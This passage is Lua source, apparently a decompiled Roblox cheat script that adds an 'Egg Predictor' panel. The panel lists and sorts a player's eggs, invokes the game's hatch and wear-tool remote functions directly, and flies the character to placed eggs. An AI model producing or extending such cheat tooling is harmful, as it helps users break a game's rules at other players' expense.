					local v20 = string.upper(fn7(v19))

					if v19 == "Rainbow" or v19 == "Prismatic" then
						local tbl30 = {}

						for i = 1, #v20 do
							table.insert(tbl30, tbl7.Paint(tbl28[(i - 1) % #tbl28 + 1], string.sub(v20, i, i)))
						end

						table.insert(tbl29, tbl7.Bold(table.concat(tbl30)))
					else
						table.insert(tbl29, tbl7.Bold(tbl7.Paint(tbl27[v19] or "#8FE3FF", tbl7.Escape(v20))))
					end
				end
			end

			return table.concat(tbl29, " ")
		end

		local rarityGradients = nil

		local function fn25(arg)
			if type(arg) == "table" and typeof(arg.RarityGradient) == "Instance" then
				return arg.RarityGradient
			end

			if rarityGradients == nil then
				local assets = ReplicatedStorage:FindFirstChild("Assets")
				local ui = assets and assets:FindFirstChild("UI")
				rarityGradients = ui and ui:FindFirstChild("RarityGradients") or false
			end

			if not rarityGradients or type(arg) ~= "table" then
				return nil
			end
			local v19 = rarityGradients:FindFirstChild(tostring(arg._id or arg.DisplayName or ""))
			return v19 and v19:FindFirstChild("RarityGradient") or nil
		end

		local tbl29 = {}

		tbl7.AssetInfo = function(arg)
			local category = tostring(arg)
			local v19 = tbl29[category]
			if v19 then
				return v19
			end
			local directory = tbl.Assets and tbl.Assets.Directory
			local flag8 = type(directory) == "table" and directory[category] or nil

			if flag8 == nil and type(directory) == "table" then
				local v20 = string.gsub(string.lower(category), "[^%a%d]", "")

				for k, v21 in pairs(directory) do
					if type(v21) == "table" then
						local tbl30 = {}
						local str = tostring(k)
						local str2 = tostring(v21._id or "")
						local v22 = tostring
						local displayName = v21.DisplayName or ""
						local v23 = table.pack(v22(displayName))
						tbl30[1] = str
						tbl30[2] = str2

						do
							local values = table.pack(table.unpack(v23, 1, v23.n))
							table.move(values, 1, values.n, 3, tbl30)
						end

						local egg = type(v21.Egg) == "table" and v21.Egg or nil

						if egg ~= nil then
							tbl30[#tbl30 + 1] = tostring(egg.ModelName or "")
						end

						for _, v24 in ipairs(tbl30) do
							if v24 ~= "" and string.gsub(string.lower(v24), "[^%a%d]", "") == v20 then
								flag8 = v21
								break
							end
						end
					end

					if flag8 == nil then
						continue
					end
					break
				end
			end

			local rarity = type(flag8) == "table" and type(flag8.Rarity) == "table" and flag8.Rarity or nil
			local icon = type(flag8) == "table" and flag8.Icon or nil
			local rarity2

			if rarity then
				rarity2 = tostring(rarity.DisplayName or rarity._id or "Common")
			else
				rarity2 = rarity
			end

			rarity2 = rarity2 or "Common"
			local color3 = rarity and typeof(rarity.Color) == "Color3" and rarity.Color or Color3.fromRGB(255, 255, 255)
			local tbl30 = {}
			local name = type(flag8) == "table"

			if name then
				name = tostring(flag8.DisplayName or category)
			end

			tbl30.Name = name or category
			tbl30.Category = category
			tbl30.Rarity = rarity2
			local rarityNumber

			if rarity then
				rarityNumber = tonumber(rarity.RarityNumber or rarity.Rank)
			else
				rarityNumber = rarity
			end

			tbl30.RarityNumber = rarityNumber or 0
			tbl30.Color = color3
			tbl30.Hex = "#" .. string.upper(color3:ToHex())
			tbl30.Gradient = fn25(rarity)
			tbl30.EarningRate = type(flag8) == "table" and tonumber(flag8.EarningRate) or 0
			tbl30.Icon = type(icon) == "string" and icon ~= "" and icon or nil
			tbl29[category] = tbl30
			return tbl30
		end

		tbl7.Income = function(arg, arg2, arg3)
			if type(arg2) ~= "number" or arg2 <= 0 then
				return 0
			end
			return math.max(math.round(arg.EarningRate * tbl7.ScaleFactor(arg2) * tbl7.MutationMultiplier(arg3)), 1)
		end

		local function isShown(arg)
			if typeof(arg) ~= "Instance" or not arg:IsDescendantOf(game) then
				return false
			end

			while arg do
				if arg:IsA("GuiObject") and not arg.Visible then
					return false
				end

				if arg:IsA("LayerCollector") then
					return arg.Enabled
				end
				arg = arg.Parent
			end

			return false
		end

		tbl7.PageVisible = function()
			local ok, result = pcall(function()
				return v18.Page
			end)

			if not ok or typeof(result) ~= "Instance" then
				return true
			end
			return isShown(result) and result.AbsoluteSize.X > 0
		end

		tbl7.IsShown = isShown
	end

	local tbl16
	tbl16 = { "Value", "Rarity", "Time Left" }
	local tbl17

	tbl17 = {
		{ Key = "Ready", Title = "READY TO HATCH", Color = tbl7.Color.Ready },
		{ Key = "Growing", Title = "GROWING", Color = tbl7.Color.Growing },
		{ Key = "Inventory", Title = "IN INVENTORY", Color = tbl7.Color.Inventory },
	}

	local n13
	n13 = 1
	local paint
	paint = tbl7.Paint
	local bold
	bold = tbl7.Bold
	local color3
	color3 = tbl7.Color
	local tbl18
	tbl18 = { Sort = tbl16[1], Spotlight = true }
	local id
	id = nil
	local n14
	n14 = 0.0909
	local v18
	v18 = nil
	local tbl19
	tbl19 = {}
	local tbl20
	tbl20 = {}
	local tbl21
	tbl21 = {}
	local tbl22
	tbl22 = {}
	local n15
	n15 = 0
	local n16
	n16 = 0
	local n17
	n17 = 0.06
	local n18
	n18 = -1
	local n19, n20, n21, flag8, n22, flag9, n23, flag10, v19, requestEggRefresh

	do
		local n24 = -1
		n19 = -1
		n20 = 4
		n21 = 3
		flag8 = false
		n22 = 0
		flag9 = true
		n23 = 0
		flag10 = false
		v19 = nil

		requestEggRefresh = function()
			flag9 = true
		end

		local function fn24(arg)
			if not arg or arg.DiffWrapped then
				return arg
			end
			local set = arg.Set
			arg.DiffWrapped = true

			arg.Set = function(arg2)
				if type(arg2) ~= "table" then
					return set(arg2)
				end
				local spec = arg.Spec
				local tbl23 = nil

				for k, v20 in pairs(arg2) do
					if spec[k] ~= v20 then
						tbl23 = tbl23 or {}
						tbl23[k] = v20
					end
				end

				if tbl23 then
					set(tbl23)
				end

				return arg
			end

			return arg
		end

		local function fn25(arg, arg2)
			local v20 = string.gsub(tostring(arg.Spec.Text or ""), "%d", "0")
			return tostring(n16) .. "|" .. tostring(arg2) .. "|" .. v20
		end

		local function fn26(arg, arg2)
			local eggRecords = tbl.EggRecords
			if type(eggRecords) ~= "table" or type(eggRecords.GrowthSecondsRemaining) ~= "function" then
				return 0, 0
			end
			local n25 = 1

			if type(eggRecords.GrowthSpeedMultiplier) == "function" then
				local ok
				ok, n25 = pcall(eggRecords.GrowthSpeedMultiplier, arg)
				ok = ok and type(n25) == "number"
				local n26 = 1

				if not ok then
					n25 = n26
				end
			end

			local ok, result = pcall(eggRecords.GrowthSecondsRemaining, arg, arg2, n25)
			ok = ok and type(result) == "number"
			local n26 = 0

			if not ok then
				result = n26
			end

			local n27 = 0

			if type(eggRecords.GrowthDuration) == "function" then
				local ok2, result2 = pcall(eggRecords.GrowthDuration, arg)

				if ok2 and type(result2) == "number" then
					n27 = result2
				end
			end

			return result, n27
		end

		local function fn27(arg)
			local eggRecords = tbl.EggRecords

			if type(eggRecords) == "table" and type(eggRecords.WeightKg) == "function" then
				local ok, result = pcall(eggRecords.WeightKg, arg)
				if ok and type(result) == "number" then
					return result
				end
			end

			return 0
		end

		local function fn28()
			local eggState = tbl.EggState
			if type(eggState) ~= "table" or type(eggState.ReadOwnerEggs) ~= "function" then
				return nil
			end
			local ok, result = pcall(eggState.ReadOwnerEggs, localPlayer.UserId)
			if not ok or type(result) ~= "table" then
				return nil
			end
			local serverTimeNow = workspace:GetServerTimeNow()
			local tbl23 = {}

			for k, v20 in pairs(result) do
				if type(v20) == "table" then
					local v21 = tbl7.AssetInfo(v20.AssetCategory)
					local n25 = tonumber(v20.AssetScale) or 0
					local mutations = type(v20.Mutations) == "table" and v20.Mutations or {}

					local tbl24 = {
						Id = k,
						Info = v21,
						Scale = n25,
						Weight = fn27(v20),
						Mutations = mutations,
						Income = tbl7.Income(v21, n25, mutations),
						Status = "Inventory",
						Remaining = math.huge,
						Percent = 0,
					}

					if v20.Placement ~= nil then
						local ok2, result2 = pcall(eggState.IsReadyToHatch, k)

						if ok2 and result2 then
							tbl24.Status = "Ready"
							tbl24.Remaining = 0
							tbl24.Percent = 100
						else
							local v22, v23 = fn26(v20, serverTimeNow)
							tbl24.Status = "Growing"
							tbl24.Remaining = v22

							if v23 > 0 then
								tbl24.Percent = math.clamp(math.floor((1 - v22 / v23) * 100), 0, 100)
							end
						end
					end

					table.insert(tbl23, tbl24)
				end
			end

			return tbl23
		end

		local function fn29(arg)
			local sort = tbl18.Sort

			table.sort(arg, function(arg2, arg3)
				if sort == tbl16[2] and arg2.Info.RarityNumber ~= arg3.Info.RarityNumber then
					return arg2.Info.RarityNumber > arg3.Info.RarityNumber
				end

				if sort == tbl16[3] and arg2.Remaining ~= arg3.Remaining then
					return arg2.Remaining < arg3.Remaining
				end
				return arg2.Income > arg3.Income
			end)
		end

		local function fn30(arg)
			if arg.Status == "Ready" then
				return bold(paint(color3.Ready, "Ready to hatch"))
			end

			if arg.Status == "Growing" then
				return bold(paint(color3.Clock, tbl7.FormatClock(arg.Remaining))) .. tbl7.Separator() .. paint(color3.Growing, arg.Percent .. "%")
			end
			return paint(color3.Inventory, "In inventory")
		end

		local function fn31(arg)
			local tbl23 = {}
			local v20 = tbl7.MutationText(arg.Mutations)
			table.insert(tbl23, bold(paint(color3.Income, tbl7.FormatRate(arg.Income))))
			table.insert(tbl23, paint(color3.Scale, string.format("%.2fx", arg.Scale)))
			table.insert(tbl23, paint(color3.Weight, tbl7.FormatWeight(arg.Weight)))

			if v20 ~= "" then
				table.insert(tbl23, v20)
			end

			return table.concat(tbl23, tbl7.Separator())
		end

		local n25 = 5
		local n26 = n25 + 0.8
		local n27 = 1.2
		local n28 = 1.2
		local n29 = 0.936
		local n30 = 2.3
		local n31 = 0.25
		local n32 = 0.18
		local n33 = n30 + 0.6
		local n34 = 0.24
		local n35 = 0.22

		local function fn32(arg)
			if string.upper(tostring(arg.Rarity)) == "SECRET" then
				return tbl7.SecretGradient
			end
			return arg.Gradient
		end

		local function fn33(arg)
			return fn32(arg) ~= nil and Color3.fromRGB(255, 255, 255) or arg.Color
		end

		local function fn34(arg)
			if string.upper(tostring(arg.Rarity)) == "SECRET" then
				return tbl7.SecretRotation
			end
			return nil
		end

		local function fn35(arg)
			local v20 = arg and arg.Get()
			if not v20 or n16 <= 0 then
				return nil
			end

			if v20.Text ~= tostring(arg.Spec.Text or "") then
				return nil
			end
			return v20
		end

		local function fn36(arg)
			local v20 = fn25(arg, "w")
			if arg.WidthKey == v20 then
				return arg.WidthUnits
			end
			local v21 = fn35(arg)
			if not v21 then
				return nil
			end
			local size = v21.Size
			local textWrapped = v21.TextWrapped
			v21.TextWrapped = false
			v21.Size = UDim2.fromOffset(100000, math.max(1, size.Y.Offset))
			local x = v21.TextBounds.X
			v21.Size = size
			v21.TextWrapped = textWrapped
			if x <= 0 then
				return nil
			end
			local widthUnits = x / n16
			arg.WidthKey = v20
			arg.WidthUnits = widthUnits
			return arg.WidthUnits
		end

		local function fn37(arg, arg2)
			local v20 = fn25(arg, math.floor(arg2 * 100 + 0.5))
			if arg.HeightKey == v20 then
				return arg.HeightUnits
			end
			local v21 = fn35(arg)
			if not v21 then
				return nil
			end
			local size = v21.Size
			v21.Size = UDim2.fromOffset(math.max(1, math.floor(arg2 * n16 + 0.5)), 100000)
			local y = v21.TextBounds.Y
			v21.Size = size
			if y <= 0 then
				return nil
			end
			local heightUnits = y / n16
			arg.HeightKey = v20
			arg.HeightUnits = heightUnits
			return arg.HeightUnits
		end

		local function fn38(arg)
			local rfEggWorldAskHatch = networking:FindFirstChild("RF/EggWorld/AskHatch")
			if not rfEggWorldAskHatch or not rfEggWorldAskHatch:IsA("RemoteFunction") then
				return false
			end
			local ok, result = pcall(rfEggWorldAskHatch.InvokeServer, rfEggWorldAskHatch, arg)
			if not ok or result == false then
				return false
			end
			task.wait(0.35)
			local rfEggWorldAskFinishHatch = networking:FindFirstChild("RF/EggWorld/AskFinishHatch")

			if rfEggWorldAskFinishHatch and rfEggWorldAskFinishHatch:IsA("RemoteFunction") then
				pcall(rfEggWorldAskFinishHatch.InvokeServer, rfEggWorldAskFinishHatch, arg)
			end

			return true
		end

		tbl19.RunAction = function()
			local focus = tbl19.Focus
			if type(focus) ~= "table" or focus.Id == nil then
				return
			end
			local str = tostring(focus.Id)

			if focus.Status == "Inventory" then
				local eggState = tbl.EggState
				if type(eggState) == "table" and type(eggState.WearEggTool) == "function" and pcall(eggState.WearEggTool, str) then
					return
				end
				local rfEggWorldAskWearTool = networking:FindFirstChild("RF/EggWorld/AskWearTool")

				if rfEggWorldAskWearTool and rfEggWorldAskWearTool:IsA("RemoteFunction") then
					pcall(rfEggWorldAskWearTool.InvokeServer, rfEggWorldAskWearTool, str)
				end

				return
			end

			if focus.Status == "Ready" then
				if not tbl19.Hatching then
					tbl19.Hatching = true
					pcall(fn38, str)
					tbl19.Hatching = false
				end

				return
			end

			if tbl19.Flying or type(tbl4.FlyTo) ~= "function" then
				return
			end
			local placedEggRenders = workspace:FindFirstChild("PlacedEggRenders")
			local v20 = nil

			if placedEggRenders then
				for _, child in ipairs(placedEggRenders:GetChildren()) do
					if string.find(child.Name, str, 1, true) or child:GetAttribute("Uid") == str then
						v20 = child
						break
					end
				end
			end

			if not v20 then
				return
			end

			local ok, result = pcall(function()
				return v20:IsA("Model") and v20:GetPivot() or v20.CFrame
			end)

			if not ok then
				return
			end
			local movement = tbl4.Movement
			if movement.Owner ~= nil and movement.Owner ~= "treadmill" or movement.PlaceWanted or tbl4.Steal.Active or tbl4.Steal.Wanted or tbl4.Steal.Carrying then
				return
			end
			tbl19.Flying = true

			if tbl4.ClaimMovement("predictor") then
				if tbl4.Treadmill.Riding or tbl4.OnBelt() then
					pcall(tbl4.ExitBelt)
				end

				pcall(tbl4.FlyTo, result.Position + Vector3.new(0, 3, 0), function()
					return false
				end, "fly")

				tbl4.ReleaseMovement("predictor")
			end

			tbl19.Flying = false
		end

		local function fn39(arg)
			v18 = arg
			arg:SetDock(5, { Gap = n35, DividerColor = Color3.fromRGB(170, 174, 184) })
			local v20 = arg:Dock()

			tbl19.Icon = arg:Image({
				Parent = v20,
				X = 0,
				Y = 0,
				Width = n25,
				Height = n25,
				Corner = 0.35,
				Background = "#000000",
				BackgroundTransparency = 0.26,
				StrokeThickness = n14,
				StrokeTransparency = 0,
				ZIndex = 8,
			})

			tbl19.Name = arg:Text({
				Parent = v20,
				X = n26,
				Y = 0,
				Height = n27,
				Scale = n28,
				Wrap = false,
				Gradient = tbl7.NameGradient,
				TextStrokeTransparency = 1,
				ZIndex = 9,
			})

			tbl19.Rarity = arg:Text({
				Parent = v20,
				X = n26,
				Y = 0,
				Height = n27,
				Scale = n29,
				Wrap = false,
				Font = tbl7.RarityFont,
				TextStrokeTransparency = 1,
				StrokeTransparency = 0.08,
				ZIndex = 9,
			})

			tbl19.Info = arg:Text({ Parent = v20, X = n26, Y = n27, Height = n25 - n27, Wrap = false, ZIndex = 9 })

			tbl19.Action = arg:Button({
				Parent = v20,
				X = 0,
				Y = 0,
				Width = 5,
				Height = n27 - 0.1,
				Text = "",
				Scale = 1,
				Background = "#000000",
				BackgroundTransparency = 0.55,
				HoverTransparency = 0.3,
				PressTransparency = 0.15,
				Corner = 0.35,
				StrokeColor = Color3.fromRGB(255, 255, 255),
				StrokeThickness = n14,
				StrokeTransparency = 0.6,
				Visible = false,
				ZIndex = 10,
				Callback = function()
					if type(tbl19.RunAction) == "function" then
						task.spawn(tbl19.RunAction)
					end
				end,
			})

			arg:OnResize(function(arg2, arg3, arg4)
				if arg3 == n18 and arg4 == n24 then
					return
				end
				n18 = arg3
				n24 = arg4
				n15 = arg3 / math.max(arg4, 1)
				n16 = arg4
				n22 = 2
				n17 = 0.9 / math.max(arg:TextSize(), 1)
				tbl19.Rarity.Set({ StrokeThickness = n17 })

				for _, v21 in ipairs(tbl20) do
					v21.Rarity.Set({ StrokeThickness = n17 })
				end
			end)

			for _, v21 in ipairs({ "Icon", "Name", "Rarity", "Info", "Action" }) do
				fn24(tbl19[v21])
			end
		end

		local function fn40(arg)
			local v20 = tbl21[arg]

			if not v20 then
				v20 = v18:Text({ Name = "Line", X = 0, Y = 0, Width = 1, Height = 1, Wrap = true, Visible = false })
				tbl21[arg] = fn24(v20)
			end

			return v20
		end

		local function fn41(arg)
			local v20 = tbl20[arg]
			if v20 then
				return v20
			end
			local tbl23 = {}

			tbl23.Frame = v18:Button({
				Name = "Entry",
				Text = "",
				Background = "#000000",
				BackgroundTransparency = 0.74,
				HoverTransparency = 0.46,
				PressTransparency = 0.3,
				Corner = 0.35,
				X = 0,
				Y = 0,
				Width = 1,
				Height = 1,
				Visible = false,
				Callback = function()
					if tbl23.Id ~= nil then
						id = tbl23.Id
						requestEggRefresh()
					end
				end,
			})

			tbl23.Icon = v18:Image({
				Parent = tbl23.Frame,
				X = n31,
				Y = 0,
				Width = n30,
				Height = n30,
				Corner = 0.35,
				Background = "#000000",
				BackgroundTransparency = 0.45,
				StrokeThickness = n14,
				StrokeTransparency = 0,
			})

			tbl23.Name = v18:Text({
				Parent = tbl23.Frame,
				X = n31 + n33,
				Y = 0,
				Width = 1,
				Height = n27,
				Scale = n28,
				Wrap = false,
				Gradient = tbl7.NameGradient,
				TextStrokeTransparency = 1,
			})

			tbl23.Rarity = v18:Text({
				Parent = tbl23.Frame,
				X = n31 + n33,
				Y = 0,
				Width = 1,
				Height = n27,
				Scale = n29,
				Wrap = false,
				Font = tbl7.RarityFont,
				TextStrokeTransparency = 1,
				StrokeTransparency = 0.08,
				StrokeThickness = n17,
			})

			tbl23.Detail = v18:Text({
				Parent = tbl23.Frame,
				X = n31 + n33,
				Y = n27,
				Width = math.max(1, n15 - n33 - n31 * 2),
				Height = 1,
				Wrap = true,
			})

			tbl23.Status = v18:Text({ Parent = tbl23.Frame, X = 0, Y = 0, Width = 1, Height = n27, Wrap = false, Align = "Right" })

			for _, v21 in ipairs({ "Frame", "Icon", "Name", "Rarity", "Detail", "Status" }) do
				fn24(tbl23[v21])
			end

			tbl20[arg] = tbl23
			return tbl23
		end

		local function fn42(arg)
			local tbl23 = { Ready = 0, Growing = 0, Inventory = 0 }
			local n36 = 0
			local v20 = nil

			for _, v21 in ipairs(arg) do
				local status = v21.Status
				tbl23[status] = tbl23[status] + 1
				n36 += v21.Income

				if not v20 or v21.Income > v20.Income then
					v20 = v21
				end
			end

			return bold(paint(color3.Text, tostring(#arg) .. " eggs")) .. tbl7.Separator() .. bold(paint(color3.Ready, tbl23.Ready .. " ready")) .. tbl7.Separator() .. bold(paint(color3.Growing, tbl23.Growing .. " growing")) .. tbl7.Separator() .. bold(paint(color3.Inventory, tbl23.Inventory .. " in bag")) .. tbl7.Separator() .. paint(color3.Text, "Total") .. " " .. bold(paint(color3.Income, tbl7.FormatRate(n36))), v20
		end

		local function fn43(arg, arg2)
			if arg2 == "" then
				return true
			end
			local str = " " .. arg.Status
			local v20 = string.lower(tostring(arg.Info.Name) .. " " .. tostring(arg.Info.Rarity) .. str)

			for _, mutation in ipairs(arg.Mutations) do
				v20 ..= " " .. string.lower(tostring(mutation))
			end

			return string.find(v20, arg2, 1, true) ~= nil
		end

		local function fn44(arg)
			local tbl23 = {}
			local v20 = bold(paint(color3.Income, tbl7.FormatRate(arg.Income)))
			local str = paint(color3.Scale, string.format("%.2fx", arg.Scale)) .. tbl7.Separator() .. paint(color3.Weight, tbl7.FormatWeight(arg.Weight))
			tbl23[1] = v20
			tbl23[2] = str

			do
				local values = table.pack(fn30(arg))
				table.move(values, 1, values.n, 3, tbl23)
			end

			local v21 = tbl7.MutationText(arg.Mutations)
			table.insert(tbl23, v21 ~= "" and v21 or paint(color3.Hint, "Tap an egg below to preview it"))
			return table.concat(tbl23, "\n")
		end

		local function fn45(arg)
			local flag11 = tbl18.Spotlight and arg ~= nil

			if v19 ~= flag11 then
				v19 = flag11
				v18:SetDock(flag11 and 5 or 0, { Gap = n35 })
			end

			tbl19.Icon.Set({ Visible = flag11 })
			tbl19.Name.Set({ Visible = flag11 })
			tbl19.Rarity.Set({ Visible = flag11 })
			tbl19.Info.Set({ Visible = flag11 })
			tbl19.Action.Set({ Visible = flag11 })
			tbl19.Focus = flag11 and arg or nil
			if not flag11 then
				return
			end
			local info = arg.Info
			local set = tbl19.Action.Set
			local tbl23 = {}
			local text = arg.Status == "Inventory" and bold(paint(color3.Inventory, "Hold egg"))

			if not text then
				text = arg.Status == "Ready" and bold(paint(color3.Ready, "Hatch egg")) or bold(paint(color3.Growing, "Fly to egg"))
			end

			tbl23.Text = text
			set(tbl23)
			tbl19.Icon.Set({ Visible = info.Icon ~= nil, Image = info.Icon or "", StrokeColor = info.Color })
			tbl19.Name.Set({ Text = tbl7.Escape(info.Name) })

			tbl19.Rarity.Set({
				Text = string.upper(tostring(info.Rarity)),
				Color = fn33(info),
				Gradient = fn32(info),
				GradientRotation = fn34(info),
			})

			tbl19.Info.Set({ Text = fn44(arg) })
		end

		local function fn46(arg, arg2)
			local info = arg2.Info
			arg.Id = arg2.Id
			arg.Frame.Set({ Visible = true, BackgroundTransparency = arg2.Id == id and 0.12 or 0.74 })
			arg.Icon.Set({ Visible = info.Icon ~= nil, Image = info.Icon or "", StrokeColor = info.Color })
			arg.Name.Set({ Text = tbl7.Escape(info.Name) })

			arg.Rarity.Set({
				Text = string.upper(tostring(info.Rarity)),
				Color = fn33(info),
				Gradient = fn32(info),
				GradientRotation = fn34(info),
			})

			arg.Detail.Set({ Text = fn31(arg2) })
			arg.Status.Set({ Text = fn30(arg2) })
		end

		local function fn47()
			if n15 <= 0 then
				return
			end
			flag8 = false
			local n36 = math.max(1, n15 - n26)
			local v20 = fn36(tbl19.Action)

			if v20 then
				tbl19.ActionUnits = v20 + 1.4
			else
				flag8 = true
			end

			local n37 = math.min(tbl19.ActionUnits or 5, n36 * 0.45)
			local n38 = math.max(1, n36 - n37 - n34)
			tbl19.Action.Set({ X = n15 - n37, Y = 0.05, Width = n37, Height = n27 - 0.1 })
			local v21 = fn36(tbl19.Rarity)

			if v21 then
				n21 = v21 + 0.1
			else
				flag8 = true
			end

			local v22 = fn36(tbl19.Name)

			if v22 then
				n20 = math.min(v22 + 0.1, math.max(1, n38 - n21 - n34))
			else
				flag8 = true
			end

			tbl19.Name.Set({ X = n26, Y = 0, Width = n20, Height = n27 })

			tbl19.Rarity.Set({
				X = n26 + n20 + n34,
				Y = 0,
				Width = math.max(0.5, math.min(n21, n38 - n20 - n34)),
				Height = n27,
			})

			tbl19.Info.Set({ X = n26, Y = n27, Width = n36, Height = math.max(1, n25 - n27) })
			local n39 = math.max(1, n15 - n33 - n31 * 2)
			local n40 = 0

			for _, v23 in ipairs(tbl22) do
				if v23.Kind == "text" then
					local handle = v23.Handle
					local v24 = fn37(handle, n15)

					if v24 then
						v23.Height = v24
					else
						flag8 = true
					end

					local n41 = math.max(1, v23.Height or 1)
					handle.Set({ X = 0, Y = n40 + (v23.Gap and 0.5 or 0), Width = n15, Height = n41 })
					n40 += n41 + n35 * 0.5 + (v23.Gap and 0.5 or 0)
				else
					local item = v23.Item
					local v24 = fn37(item.Detail, n39)

					if v24 then
						item.DetailUnits = v24
					else
						flag8 = true
					end

					local n41 = math.clamp(item.DetailUnits or 1, 1, 4)
					local v25 = fn36(item.Status)

					if v25 then
						item.StatusUnits = v25 + 0.23
					else
						flag8 = true
					end

					local n42 = math.min(n39 * 0.42, math.max(2.73, item.StatusUnits or 2.73))
					local n43 = math.max(1, n39 - n42 - n34)
					local v26 = fn36(item.Rarity)

					if v26 then
						item.RarityUnits = v26 + 0.1
					else
						flag8 = true
					end

					local n44 = math.min(item.RarityUnits or 3, n43 * 0.5)
					local v27 = fn36(item.Name)

					if v27 then
						item.NameUnits = v27 + 0.1
					else
						flag8 = true
					end

					local min = math.min
					local max = math.max
					local nameUnits = item.NameUnits or 4
					local max2 = math.max
					local n45 = n43 - n44 - n34
					local v28 = min(max(1, nameUnits), max2(1, n45))
					local n46 = n32 * 2
					local n47 = math.max(n41 + n27, 2.3) + n46
					local n48 = (n47 - n41 - n27) / 2
					item.Frame.Set({ X = 0, Y = n40, Width = n15, Height = n47 })
					item.Icon.Set({ Y = (n47 - n30) / 2 })
					item.Name.Set({ X = n31 + n33, Y = n48, Width = v28 })
					item.Rarity.Set({ X = n31 + n33 + v28 + n34, Y = n48, Width = math.max(0.5, n44) })
					item.Detail.Set({ X = n31 + n33, Y = n48 + n27, Width = n39, Height = n41 })

					item.Status.Set({
						Visible = v23.HasStatus,
						X = n31 + n33 + n39 - n42,
						Y = n48,
						Width = math.max(0.5, n42),
					})

					n40 += n47 + n35
				end
			end

			local n41 = math.max(1, n40)

			if math.abs(n41 - n19) > 0.01 then
				n19 = n41
				v18:SetContentLines(n41)
			end
		end

		local function fn48()
			if not v18 then
				return
			end
			n22 = 2
			local v20 = fn28()
			table.clear(tbl22)
			local n36 = 0

			local function fn49(arg, arg2)
				n36 += 1
				local v21 = fn40(n36)
				v21.Set({ Visible = true, Text = arg })
				table.insert(tbl22, { Kind = "text", Handle = v21, Gap = arg2 })
			end

			local n37

			if not v20 then
				fn45(nil)
				fn49(bold(paint(color3.Hint, "Egg data is not available yet")), false)
				n37 = 0
			else
				fn29(v20)
				local v21, v22 = fn42(v20)
				fn49(v21, false)
				local v23 = nil

				if id ~= nil then
					local v24, v25, v26 = ipairs(v20)
					local v27 = nil

					for _, v28 in v24, v25, v26 do
						if v28.Id == id then
							v27 = v28
							break
						else
							v27 = nil
						end
					end

					v23 = v27
				end

				fn45(v23 or v22)
				local v24 = string.lower(v18:Query())
				local tbl23 = {}

				for _, v25 in ipairs(v20) do
					if fn43(v25, v24) then
						table.insert(tbl23, v25)
					end
				end

				if #tbl23 == 0 then
					fn49(paint(color3.Hint, #v20 == 0 and "No eggs yet" or string.format("No results for \"%s\"", tbl7.Escape(v24))), false)
					n37 = 0
				else
					n37 = 0

					for _, v25 in ipairs(tbl17) do
						local tbl24 = {}

						for _, v26 in ipairs(tbl23) do
							if v26.Status == v25.Key then
								table.insert(tbl24, v26)
							end
						end

						if #tbl24 > 0 then
							local flag11 = #tbl22 > 0
							fn49(string.format("<b><font color=\"%s\">%s</font></b> <font color=\"#AAAAAA\">(%d)</font>", v25.Color, v25.Title, #tbl24), flag11)

							for _, v26 in ipairs(tbl24) do
								n37 += 1
								local v27 = fn41(n37)
								fn46(v27, v26)
								table.insert(tbl22, { Kind = "item", Item = v27, HasStatus = true })
							end
						end
					end
				end
			end

			for i = n36 + 1, #tbl21 do
				tbl21[i].Set({ Visible = false })
			end

			for i = n37 + 1, #tbl20 do
				tbl20[i].Frame.Set({ Visible = false })
			end

			fn47()
			n22 = 2
		end

		tbl7.RequestEggRefresh = requestEggRefresh

		if not tbl7.Ready then
			v17:CreateText({
				Name = "Egg Predictor",
				Text = "Update the Chilli Library to use the predictor canvas.",
			})
		else
			v17:CreateDropdown({
				Name = "Sort By",
				Options = tbl16,
				Default = tbl16[1],
				Callback = function(sort)
					if table.find(tbl16, sort) then
						tbl18.Sort = sort
						requestEggRefresh()
					end
				end,
			})

			v17:CreateToggle({
				Name = "Preview Card",
				Default = true,
				Callback = function(arg)
					tbl18.Spotlight = arg == true
					requestEggRefresh()
				end,
			})

			local v20 = v17:CreateCanvas({
				Name = "Egg Predictor",
				Search = true,
				SearchPlaceholder = "Search eggs...",
				Layout = "free",
				Style = {
					TextScale = 0.84,
					LineHeight = 1.1,
					MinLines = 16,
					MaxLines = 32,
					BackgroundTransparency = 0.5,
					ScrollBarColor = Color3.fromRGB(170, 174, 184),
					TextColor = Color3.fromRGB(255, 255, 255),
					TextStrokeTransparency = 0.7,
				},
				Build = function(arg)
					fn39(arg)
					requestEggRefresh()
				end,
			})

			fn4(function()
				v20:Destroy()
			end)

			local connection = RunService.Heartbeat:Connect(function(deltaTime)
				local v21 = tbl7.PageVisible()
				local flag11 = v21 and (v18 == nil or tbl7.IsShown(v18:Root()))

				if flag11 and not flag10 then
					flag9 = true
				end

				flag10 = flag11
				if not v21 then
					return
				end
				n23 += deltaTime

				if flag11 and flag9 or n23 >= n13 then
					n23 = 0

					if flag11 then
						flag9 = false
						pcall(fn48)
					end

					if tbl7.RefreshFuse then
						pcall(tbl7.RefreshFuse)
					end
				end

				local flag12

				if flag11 then
					flag12 = n22 > 0 or flag8
				else
					flag12 = flag11
				end

				if flag12 then
					if n22 > 0 then
						n22 -= 1
					end

					pcall(fn47)
				end

				if tbl7.PlaceFuse then
					tbl7.PlaceFuse()
				end
			end)

			fn4(function()
				connection:Disconnect()
			end)
		end
	end
end

local paint, bold, color2, n

do
	local tbl8 = {
		{ min = 0.85, max = 1.05, weight = 2000 },
		{ min = 1.45, max = 1.55, weight = 250 },
		{ min = 1.9, max = 2.1, weight = 125 },
		{ min = 2.85, max = 3.15, weight = 62.5 },
		{ min = 3.8, max = 4.2, weight = 31.25 },
		{ min = 0.3, max = 0.45, weight = 18 },
		{ min = 0.1, max = 0.2, weight = 5 },
		{ min = 5.8, max = 6.2, weight = 15.625 },
		{ min = 9.5, max = 12.5, weight = 3 },
		{ min = 12, max = 17, weight = 0.05 },
		{ min = 20, max = 35, weight = 0.0001 },
	}

	paint = tbl7.Paint
	bold = tbl7.Bold
	color2 = tbl7.Color
	n = 5
	local n2 = n + 0.8
	local n3 = 1.2
	local n4 = 1.2
	local n5 = 0.936
	local n6 = 2.3
	local n7 = 0.25
	local n8 = 0.18
	local n9 = n6 + 0.6
	local n10 = 0.24
	local n11 = 0.22
	local n12 = 0.0909
	local v8 = nil
	local tbl9 = {}
	local tbl10 = {}
	local tbl11 = {}
	local tbl12 = {}
	local n13 = 0
	local n14 = 0
	local n15 = 0.06
	local n16 = -1
	local n17 = -1
	local n18 = -1
	local n19 = 4
	local n20 = 3
	local flag = false
	local n21 = 0
	local v9 = nil

	local tbl13 = {
		{ Min = 0, Color = "#8F98A8" },
		{ Min = 0.3, Color = "#C6CDDA" },
